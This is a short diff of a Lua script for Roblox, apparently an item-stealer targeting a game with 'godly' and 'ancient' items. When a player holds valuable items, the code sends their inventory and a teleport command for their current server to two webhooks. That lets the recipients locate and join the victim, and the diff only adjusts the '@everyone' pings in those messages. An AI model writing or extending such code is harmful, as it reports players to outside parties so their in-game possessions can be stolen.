@@ -1089,10 +1089,10 @@ local WebHookEmbed = CreateEmbed(
 )
 
 if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1  then
-    SendWebhook(WebHook, {content = '@everyone --\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
+    SendWebhook(WebHook, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
     SendWebhook(WebHook1, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 else
-    SendWebhook(WebHook, {content = '@everyone game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
+    SendWebhook(WebHook, {content = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
     SendWebhook(WebHook1, {content = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 end
 
